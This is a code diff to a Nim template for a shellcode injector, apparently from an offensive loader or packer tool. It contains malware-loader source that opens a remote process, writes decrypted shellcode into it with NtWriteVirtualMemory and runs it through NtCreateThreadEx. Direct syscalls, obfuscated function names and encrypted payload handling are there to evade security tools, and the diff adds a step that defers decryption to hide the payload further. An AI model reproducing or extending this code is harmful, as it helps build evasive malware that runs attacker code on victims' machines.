@@ -45,6 +45,10 @@ let ShellcoderemoteinjectStub * = """
         success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
         success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
 
+    # Temporary, I'm planning to decrypt after NtWriteVirtualMemory later on, currently buggy with NimCrypto
+    ptrEncText = cast[ptr byte](addr encText[0])
+    ptrDecText = cast[ptr byte](addr decText[0])
+    decryptlate()
     when defined(SysWhispers):
         status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
@@ -62,7 +66,9 @@ let ShellcoderemoteinjectStub * = """
             echo obf("[*] oqiazasusjk: "), status
             echo obf("    \\-- bytes written: "), bytesWritten
             echo obf("")
-
+        #ptrEncText = cast[ptr byte](ds)
+        #ptrDecText = cast[ptr byte](ds)
+        #decryptlate()
         status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)
 
         status = zuatzuastdiasyy(tHandle)
@@ -120,7 +126,9 @@ let ShellcoderemoteinjectStub * = """
             else:
                 when defined(verbose):
                     echo obf("[-] Failed to find opcode for NtCreateThreadEx")
-
+        #ptrEncText = cast[ptr byte](ds)
+        #ptrDecText = cast[ptr byte](ds)
+        #decryptlate()
         status = NtCreateThreadEx(
             &tHandle, 
             THREAD_ALL_ACCESS, 
@@ -144,7 +152,7 @@ let ShellcoderemoteinjectStub * = """
    
 
 when isMainModule:
-     injectCreateRemoteThread(dectext)
+     injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory
 
 """
 
